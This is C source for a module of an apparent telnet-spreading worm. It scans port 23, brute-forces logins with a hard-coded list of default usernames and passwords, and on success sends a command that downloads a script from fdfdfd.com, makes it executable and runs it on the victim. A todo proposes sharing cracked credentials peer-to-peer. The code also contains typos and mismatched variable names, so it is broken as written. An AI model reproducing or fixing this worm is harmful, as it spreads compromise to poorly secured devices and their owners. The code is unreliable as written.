/*
telnet brute forcing, and command execution (spreading worm)

todo: p2p the networks/passwords accepted so later we can scan similar IP ranges
w the credentials we expect there..
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../../list.h"
#include "../../structs.h"
#include "../../utils.h"
#include "telnet.h"
#include "../portscan/portscan.h"

// distribution host for WORM
char distribution_host[] = "fdfdfd.com";
char distribution_filename[] = "a.sh";

char *users[] = { "root", "admin", "user", "login", "guest", "support", "cisco", NULL };
char *passwords[] = { "root", "toor", "admin", "user", "guest", "login", "changeme", "1234", 
"12345", "123456", "default", "pass", "password", "support", "vizxy", "cisco", NULL };

typedef char *(*ExpectCMD)(Modules *, Connection *, int *size);

int telnet_init(Modules **);


enum {
    STATE_TELNET_NEW=1,
    STATE_TELNET_PASSWORD=2,
    STATE_TELNET_FINDSHELL=4,
    STATE_TELNET_INSIDE=8
};

// telnet brute forcing doesnt need nearly as many functions..
ModuleFuncs telnet_funcs = { 
    NULL, NULL,
    &telnet_incoming,
    NULL,
    &telnet_main_loop,
    NULL, // no connect.. we're getting it passed over'
    &telnet_disconnect,
    NULL, NULL
};

Modules HACK_Telnet = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    23, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // we will run this every 5 seconds since we are a WORM
    5,
    // telnet functions
    &telnet_funcs, NULL,
    // no magic bytes for telnet
    NULL, 0
};


/*
// custom = after w finnish the static list.. custom can be loaded
// over network, etc
typedef struct _custom_credentials {
    struct _custom_credentials *next;
    char *str;
} CustomCredentials;

CustomCredentials *custom_users = NULL;
CustomCredentials *custom_passwords = NULL;
*/

// customstate goes in connection->buf (for keeping track of brute force, etc)
typedef struct _custom_state {
    // what username are we on..
    int username;
    // what password are we on?
    int password;
    // seconds since last expect
    unsigned int ts;
} CustomState;


CustomState *CustomState_Ptr(Connection *cptr) {
    if (cptr->buf == NULL) {
        cptr->buf = (char *)malloc(sizeof(CustomState) + 1);
        
        if (cptr->buf == NULL) return NULL;
        
        memset(cptr->buf, 0, sizeof(CustomState));
    }
    
    return (CustomState *)cptr->buf;
}


// initialize the module
int telnet_init(Modules **_module_list) {
    Module_Add(_module_list, &HACK_Telnet);
    
    Portscan_Add(&HACK_Telnet, 23);
    Portscan_Enable(23);
}

char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
    CustomState *Cstate = CustomState_Ptr(cptr);
    char *ret = NULL;
    char Auser[64];
    
    if (passwords[Cstate->password] == NULL) {
        Cstate->users++;
        Cstate->password = 0;
    }
    
    // must be completed....
    if (users[Cstate->users] == NULL) {
        ConnectionBad(cptr);
        
        return NULL;
    }
    
    memset(Auser, 0, 64);
    strcpy(Auser, users[Cstate->users]);
    strcat(Auser, "\r\n");
    
    ret = strdup(Auser);
    *size = strlen(ret);
    
    return ret;
}


char *BuildPassword(Modules *mptr, Connection *cptr, int *size) {
    CustomState *Cstate = CustomState_Ptr(cptr);
    char *ret = NULL;
    char Apassword[64];
    
    memset(Apassword, 0, 64);
    strcpy(Apassword, passwords[Cstate->passwords]);
    strcat(Apasswqord, "\r\n");
    
    ret = strdup(Apassword);
    *size = strlen(ret);
    
    return ret;
}

char *BuildVerify(Modules *mptr, Connection *cptr, int *size) {
    char *ret = strdup("id;\r\n");
    if (ret) {
        *size = strlen(ret);
    }
    return ret;
}

int str_replace_one(char **str, char *macro, char *replace) {
    char *ret = NULL;
    char *sptr = NULL;
    int p1_size = 0;
    int p2_size = 0;
    // lets just.. calculate it all together for quickness
    int size = strlen(str) + strlen(macro) + strlen(replace) + 1;
    
    if ((sptr = strcasestr(*str, macro)) == NULL)
        return 0;
        
    // calculate sizes on each side of the macro we're replacing (before and after)'
    p1_size = (int)(sptr - *str);
    sptr += strlen(macro);
    p2_size = strlen(*str) - (sptr - *str);
    
    // allocate space
    if ((ret = malloc(size + 1)) == NULL)
        return 0;
        
    memset(ret, 0, size);
    
    // copy to the new memory location the string, and the sizes
    memcpy(ret, *str, p1_size);
    memcpy(ret + p1_size, replace, strlen(replace));
    memcpy(ret + p1_size + strlen(replace), sptr, p2_size);

    free(*str);
        
    *str = ret;
    
    return 1;
}

void str_replace(char **str, char *macro, char *replace) {
    int r = 0;
    do {
        r = str_replace_one(str, macro, replace);
    } while (r > 0);
}

// we have to pass the connection its own IP.. it can be used for when it penetrates a new target (at least on this execution)
char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
    char cmdline[] = "wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
    char *ret = strdup(cmdline);
    struct sockaddr dst;
    
    // replace %IP% with the destination IP address..
    dst.s_addr = cptr->addr;    
    str_replace(&ret, "%DSTIP%", inet_ntoa(dst));
    
    // put in the distribution host..
    str_replace(&ret, "%DIST%", distribution_host);
    // now the filename
    str_replace(&ret, "%FNAME%", distribution_filename);
    if (ret)
        *size = strlen(ret);
    
    // give it 5 minute timeout starting from current time
    cptr->start_ts = time(0);
    
    return ret;
}


// every state has a command we want to write, what we expect to see, and then the new state if its found
// and a module to move the command to if we need to (for privilege escalation, etc)
typedef struct _state_commands {
    int state;
    char *expect;
    ExpectCMD BuildData;
    int new_state;
    struct _modules *next_module;
} StateCommands[] = {
    // look for login request
    { TCP_CONNECTED, "ogin:", &BuildLogin, STATE_TELNET_PASSWORD, NULL },
    // look for password request..
    { STATE_TELNET_PASSWORD, "assword:", &BuildPassword, STATE_TELNET_FINDSHELL, NULL },
    // incorrect goes back to state new. so we can attempt another..
    { STATE_TELNET_PASSWORD, "incorrect", &Incorrect, TCP_CONNECTED, NULL },
    // look for a string specifying its connected
    { STATE_TELNET_FINDSHELL, "last login", &BuildVerify, STATE_TELNET_INSIDE, NULL },
    
    //{ STATE_TELNET_FINDSHELL, "$ ", &BuildVerify, STATE_TELNET_INSIDE, NULL },
    
    // after id; we should see uid=X (means we are logged in)
    // maybe change to STATE_OK after testing.. 
    { STATE_TELNET_INSIDE, "uid", &BuildWORM, STATE_OK, NULL },
    
    // end of commands..
    { 0, NULL, NULL, 0, NULL }
};




int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    CustomState *Cstate = CustomState_Ptr(cptr);
    int ret = 0;
    int i = 0;
    char *recv_line = NULL;
    int line_size = 0;
    int cur_ts = (int)time(0);
    // hack to fix if \r\n isnt found (it wont always be like ogin: won't send new line..)
    // *** rewrite later
    int no_line = 0;
    int dsize = 0;
    char *data = NULL;
    
    for (i = 0; StateCommands[i].expect != NULL; i++) {
        if (StateCommands[i].state == cptr->state) {
            ret = 1;
            
            // retrieve 1 single line from the incoming queue
            recv_line = QueueParseAscii(cptr->incoming, &line_size);
            if (!recv_line && qptr->incoming && qptr->incoming->buf) {
                recv_line = qptr->incoming->buf;
                no_line = 1;
            }
            if (recv_line) {
                // verify what we expect is in the line..
                if (strcasestr(recv_line, StateCommands[i].expect) != NULL) {
                    cptr->state = StateCommands[i].new_state;
                    
                    if (StateCommands[i].BuildData != NULL) {
                        data = StateCommands[i].BuildData(mptr, cptr, &dsize);
                        if (data == NULL) {
                            // set as bad..
                            ret = 0;
                            // connection bad happens at end of func because ret wont be 1
                            //ConnectionBad(cptr);
                            break;
                        }
                        
                        // queue outgoing data..
                        QueueAdd(mptr, cptr, data, dsize);
                        ret = 1;
                        
                        // set timestamp to now.. so the timeout works correctly
                        Cstate->ts = cur_ts;
                    }
                } 
                // free the line.. no more use for it
                if (!no_line)
                    free(recv_line);
            }
            // no break here just in case we have multiple strings
            //break;
        }
    }
    
    // max 10 second wait per event
    if (cur_ts - Cstate->ts > 10) {
        // let the next statement deal with it..
        ret = -1;
    }
    
    if (ret != 1)
        ConnectionBad(cptr);
    
    return ret;
}

int telnet_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    int cur_ts = (int)time(0);
    // check for timeout on connection, etc
    // max of 5 minutes!
    // removed !stateOK because we want it to timeout after 5 mins of the worm string (wget, etc)
    if (cur_ts - cptr->start_ts > 300) {//} && !stateOK(cptr)) {
        ConnectionBad(cptr);
    }
}

// we must reconnect if the login list isnt completed...
int telnet_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
    CustomState *Cstate = CustomState_Ptr(cptr);
    Connection *conn = cptr;
    
    close(cptr->fd);
    cptr->fd = 0;
    
    // if an error occurs in tcp_connect().. itll already be dealt with
    if (tcp_connect(mptr, &cptr->list, cptr->addr, cptr->port, &conn) != 1) 
        ConnectionBad(cptr);
}